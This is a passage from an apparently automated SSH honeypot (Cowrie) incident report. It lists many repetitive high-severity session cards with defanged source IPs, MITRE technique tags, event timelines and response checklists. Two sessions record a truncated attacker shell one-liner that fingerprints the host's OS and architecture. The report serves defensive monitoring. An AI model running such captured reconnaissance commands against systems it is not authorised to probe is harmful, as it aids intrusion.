|---|---|
| `2026-08-25 05:07:16` | `cowrie.session.connect` |
| `2026-08-25 05:07:17` | `cowrie.client.version` |
| `2026-08-25 05:07:17` | `cowrie.client.kex` |
| `2026-08-25 05:07:17` | `cowrie.login.success` |
| `2026-08-25 05:07:18` | `cowrie.session.params` |
| `2026-08-25 05:07:18` | `cowrie.command.input` |
| `2026-08-25 05:07:18` | `cowrie.log.closed` |
| `2026-08-25 05:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c053d403e6a1

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:21` | `cowrie.session.connect` |
| `2026-08-25 05:07:21` | `cowrie.client.version` |
| `2026-08-25 05:07:21` | `cowrie.client.kex` |
| `2026-08-25 05:07:21` | `cowrie.login.success` |
| `2026-08-25 05:07:22` | `cowrie.session.params` |
| `2026-08-25 05:07:22` | `cowrie.command.input` |
| `2026-08-25 05:07:22` | `cowrie.log.closed` |
| `2026-08-25 05:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b038c84dc49b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:26` | `cowrie.session.connect` |
| `2026-08-25 05:07:26` | `cowrie.client.version` |
| `2026-08-25 05:07:26` | `cowrie.client.kex` |
| `2026-08-25 05:07:26` | `cowrie.login.success` |
| `2026-08-25 05:07:27` | `cowrie.session.params` |
| `2026-08-25 05:07:27` | `cowrie.command.input` |
| `2026-08-25 05:07:27` | `cowrie.log.closed` |
| `2026-08-25 05:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63ed4e753392

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:31` | `cowrie.session.connect` |
| `2026-08-25 05:07:31` | `cowrie.client.version` |
| `2026-08-25 05:07:31` | `cowrie.client.kex` |
| `2026-08-25 05:07:31` | `cowrie.login.success` |
| `2026-08-25 05:07:32` | `cowrie.session.params` |
| `2026-08-25 05:07:32` | `cowrie.command.input` |
| `2026-08-25 05:07:32` | `cowrie.log.closed` |
| `2026-08-25 05:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f7aa73b8dc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:36` | `cowrie.session.connect` |
| `2026-08-25 05:07:36` | `cowrie.client.version` |
| `2026-08-25 05:07:36` | `cowrie.client.kex` |
| `2026-08-25 05:07:36` | `cowrie.login.success` |
| `2026-08-25 05:07:37` | `cowrie.session.params` |
| `2026-08-25 05:07:37` | `cowrie.command.input` |
| `2026-08-25 05:07:37` | `cowrie.log.closed` |
| `2026-08-25 05:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176261b711bb

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:41` | `cowrie.session.connect` |
| `2026-08-25 05:07:41` | `cowrie.client.version` |
| `2026-08-25 05:07:41` | `cowrie.client.kex` |
| `2026-08-25 05:07:41` | `cowrie.login.success` |
| `2026-08-25 05:07:42` | `cowrie.session.params` |
| `2026-08-25 05:07:42` | `cowrie.command.input` |
| `2026-08-25 05:07:42` | `cowrie.log.closed` |
| `2026-08-25 05:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-551cba3883bc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:46` | `cowrie.session.connect` |
| `2026-08-25 05:07:46` | `cowrie.client.version` |
| `2026-08-25 05:07:46` | `cowrie.client.kex` |
| `2026-08-25 05:07:46` | `cowrie.login.success` |
| `2026-08-25 05:07:47` | `cowrie.session.params` |
| `2026-08-25 05:07:47` | `cowrie.command.input` |
| `2026-08-25 05:07:47` | `cowrie.log.closed` |
| `2026-08-25 05:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301228f2226e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:51` | `cowrie.session.connect` |
| `2026-08-25 05:07:51` | `cowrie.client.version` |
| `2026-08-25 05:07:51` | `cowrie.client.kex` |
| `2026-08-25 05:07:51` | `cowrie.login.success` |
| `2026-08-25 05:07:52` | `cowrie.session.params` |
| `2026-08-25 05:07:52` | `cowrie.command.input` |
| `2026-08-25 05:07:52` | `cowrie.log.closed` |
| `2026-08-25 05:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae76325e0699

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:07 |
| **Last Seen** | 2026-08-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:07:56` | `cowrie.session.connect` |
| `2026-08-25 05:07:56` | `cowrie.client.version` |
| `2026-08-25 05:07:56` | `cowrie.client.kex` |
| `2026-08-25 05:07:56` | `cowrie.login.success` |
| `2026-08-25 05:07:57` | `cowrie.session.params` |
| `2026-08-25 05:07:57` | `cowrie.command.input` |
| `2026-08-25 05:07:57` | `cowrie.log.closed` |
| `2026-08-25 05:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db79f53734e3

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:01` | `cowrie.session.connect` |
| `2026-08-25 05:08:01` | `cowrie.client.version` |
| `2026-08-25 05:08:01` | `cowrie.client.kex` |
| `2026-08-25 05:08:02` | `cowrie.login.success` |
| `2026-08-25 05:08:02` | `cowrie.session.params` |
| `2026-08-25 05:08:02` | `cowrie.command.input` |
| `2026-08-25 05:08:02` | `cowrie.log.closed` |
| `2026-08-25 05:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43039cfadec7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:06` | `cowrie.session.connect` |
| `2026-08-25 05:08:06` | `cowrie.client.version` |
| `2026-08-25 05:08:06` | `cowrie.client.kex` |
| `2026-08-25 05:08:06` | `cowrie.login.success` |
| `2026-08-25 05:08:07` | `cowrie.session.params` |
| `2026-08-25 05:08:07` | `cowrie.command.input` |
| `2026-08-25 05:08:07` | `cowrie.log.closed` |
| `2026-08-25 05:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0834d2e1576e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:11` | `cowrie.session.connect` |
| `2026-08-25 05:08:11` | `cowrie.client.version` |
| `2026-08-25 05:08:11` | `cowrie.client.kex` |
| `2026-08-25 05:08:11` | `cowrie.login.success` |
| `2026-08-25 05:08:12` | `cowrie.session.params` |
| `2026-08-25 05:08:12` | `cowrie.command.input` |
| `2026-08-25 05:08:12` | `cowrie.log.closed` |
| `2026-08-25 05:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bf1fc63963

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:15` | `cowrie.session.connect` |
| `2026-08-25 05:08:15` | `cowrie.client.version` |
| `2026-08-25 05:08:15` | `cowrie.client.kex` |
| `2026-08-25 05:08:15` | `cowrie.login.success` |
| `2026-08-25 05:08:16` | `cowrie.session.params` |
| `2026-08-25 05:08:16` | `cowrie.command.input` |
| `2026-08-25 05:08:16` | `cowrie.log.closed` |
| `2026-08-25 05:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18f20eb0115d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:20` | `cowrie.session.connect` |
| `2026-08-25 05:08:20` | `cowrie.client.version` |
| `2026-08-25 05:08:20` | `cowrie.client.kex` |
| `2026-08-25 05:08:20` | `cowrie.login.success` |
| `2026-08-25 05:08:21` | `cowrie.session.params` |
| `2026-08-25 05:08:21` | `cowrie.command.input` |
| `2026-08-25 05:08:21` | `cowrie.log.closed` |
| `2026-08-25 05:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99478fb6777e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:24` | `cowrie.session.connect` |
| `2026-08-25 05:08:24` | `cowrie.client.version` |
| `2026-08-25 05:08:24` | `cowrie.client.kex` |
| `2026-08-25 05:08:25` | `cowrie.login.success` |
| `2026-08-25 05:08:26` | `cowrie.session.params` |
| `2026-08-25 05:08:26` | `cowrie.command.input` |
| `2026-08-25 05:08:26` | `cowrie.log.closed` |
| `2026-08-25 05:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa6094c4315

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:29` | `cowrie.session.connect` |
| `2026-08-25 05:08:29` | `cowrie.client.version` |
| `2026-08-25 05:08:29` | `cowrie.client.kex` |
| `2026-08-25 05:08:29` | `cowrie.login.success` |
| `2026-08-25 05:08:30` | `cowrie.session.params` |
| `2026-08-25 05:08:30` | `cowrie.command.input` |
| `2026-08-25 05:08:30` | `cowrie.log.closed` |
| `2026-08-25 05:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf4aa346585f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:34` | `cowrie.session.connect` |
| `2026-08-25 05:08:34` | `cowrie.client.version` |
| `2026-08-25 05:08:34` | `cowrie.client.kex` |
| `2026-08-25 05:08:34` | `cowrie.login.success` |
| `2026-08-25 05:08:35` | `cowrie.session.params` |
| `2026-08-25 05:08:35` | `cowrie.command.input` |
| `2026-08-25 05:08:35` | `cowrie.log.closed` |
| `2026-08-25 05:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8bb96d555f1

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:39` | `cowrie.session.connect` |
| `2026-08-25 05:08:39` | `cowrie.client.version` |
| `2026-08-25 05:08:39` | `cowrie.client.kex` |
| `2026-08-25 05:08:39` | `cowrie.login.success` |
| `2026-08-25 05:08:40` | `cowrie.session.params` |
| `2026-08-25 05:08:40` | `cowrie.command.input` |
| `2026-08-25 05:08:40` | `cowrie.log.closed` |
| `2026-08-25 05:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e984aa478e28

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:44` | `cowrie.session.connect` |
| `2026-08-25 05:08:44` | `cowrie.client.version` |
| `2026-08-25 05:08:44` | `cowrie.client.kex` |
| `2026-08-25 05:08:44` | `cowrie.login.success` |
| `2026-08-25 05:08:45` | `cowrie.session.params` |
| `2026-08-25 05:08:45` | `cowrie.command.input` |
| `2026-08-25 05:08:45` | `cowrie.log.closed` |
| `2026-08-25 05:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77edd0655775

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:44` | `cowrie.session.connect` |
| `2026-08-25 05:08:45` | `cowrie.client.version` |
| `2026-08-25 05:08:45` | `cowrie.client.kex` |
| `2026-08-25 05:08:46` | `cowrie.login.success` |
| `2026-08-25 05:08:47` | `cowrie.session.params` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.success` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:47` | `cowrie.command.input` |
| `2026-08-25 05:08:48` | `cowrie.log.closed` |
| `2026-08-25 05:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a6a88a0e6a1

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:49` | `cowrie.session.connect` |
| `2026-08-25 05:08:49` | `cowrie.client.version` |
| `2026-08-25 05:08:49` | `cowrie.client.kex` |
| `2026-08-25 05:08:49` | `cowrie.login.success` |
| `2026-08-25 05:08:50` | `cowrie.session.params` |
| `2026-08-25 05:08:50` | `cowrie.command.input` |
| `2026-08-25 05:08:50` | `cowrie.log.closed` |
| `2026-08-25 05:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dedaf723ab70

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:54` | `cowrie.session.connect` |
| `2026-08-25 05:08:54` | `cowrie.client.version` |
| `2026-08-25 05:08:54` | `cowrie.client.kex` |
| `2026-08-25 05:08:54` | `cowrie.login.success` |
| `2026-08-25 05:08:55` | `cowrie.session.params` |
| `2026-08-25 05:08:55` | `cowrie.command.input` |
| `2026-08-25 05:08:55` | `cowrie.log.closed` |
| `2026-08-25 05:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71d2161075e7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:08 |
| **Last Seen** | 2026-08-25 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:08:59` | `cowrie.session.connect` |
| `2026-08-25 05:08:59` | `cowrie.client.version` |
| `2026-08-25 05:08:59` | `cowrie.client.kex` |
| `2026-08-25 05:08:59` | `cowrie.login.success` |
| `2026-08-25 05:09:00` | `cowrie.session.params` |
| `2026-08-25 05:09:00` | `cowrie.command.input` |
| `2026-08-25 05:09:00` | `cowrie.log.closed` |
| `2026-08-25 05:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c122e8315819

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:09 |
| **Last Seen** | 2026-08-25 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:09:04` | `cowrie.session.connect` |
| `2026-08-25 05:09:04` | `cowrie.client.version` |
| `2026-08-25 05:09:04` | `cowrie.client.kex` |
| `2026-08-25 05:09:04` | `cowrie.login.success` |
| `2026-08-25 05:09:05` | `cowrie.session.params` |
| `2026-08-25 05:09:05` | `cowrie.command.input` |
| `2026-08-25 05:09:05` | `cowrie.log.closed` |
| `2026-08-25 05:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59edfab9320e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:10 |
| **Last Seen** | 2026-08-25 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
